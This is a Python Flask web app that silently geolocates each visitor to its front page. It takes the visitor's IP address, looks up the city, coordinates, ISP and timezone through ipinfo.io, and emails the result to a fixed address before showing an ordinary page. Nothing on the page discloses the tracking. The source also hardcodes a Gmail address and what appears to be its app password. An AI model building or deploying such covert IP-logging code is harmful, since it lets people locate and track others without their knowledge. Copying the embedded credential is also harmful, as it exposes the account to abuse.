from flask import Flask, request, render_template
import requests
import smtplib
from email.message import EmailMessage

app = Flask(__name__)

# Email settings
YOUR_EMAIL = "kiksymyguy@gmail.com"
YOUR_APP_PASSWORD = "axie xddp ltxy lwdi"
SEND_TO_EMAIL = "samuel.akinola@rocketmail.com"

def send_email(subject, body):
    msg = EmailMessage()
    msg.set_content(body)
    msg["Subject"] = subject
    msg["From"] = YOUR_EMAIL
    msg["To"] = SEND_TO_EMAIL

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(YOUR_EMAIL, YOUR_APP_PASSWORD)
        smtp.send_message(msg)

@app.route('/')
def home():
    user_ip = request.remote_addr
    location_data = {}

    try:
        response = requests.get(f"https://ipinfo.io/{user_ip}/json")
        location_data = response.json()
    except Exception as e:
        location_data = {"error": str(e)}

    # Compose email content
    body = f"""
    Visitor IP: {user_ip}
    City: {location_data.get('city')}
    Region: {location_data.get('region')}
    Country: {location_data.get('country')}
    Coordinates: {location_data.get('loc')}
    ISP: {location_data.get('org')}
    Timezone: {location_data.get('timezone')}
    """

    send_email("New Visitor Location", body)

    return render_template("index.html")


if __name__ == '__main__':
    from os import environ
    app.run(host='0.0.0.0', port=int(environ.get("PORT", 5000)))
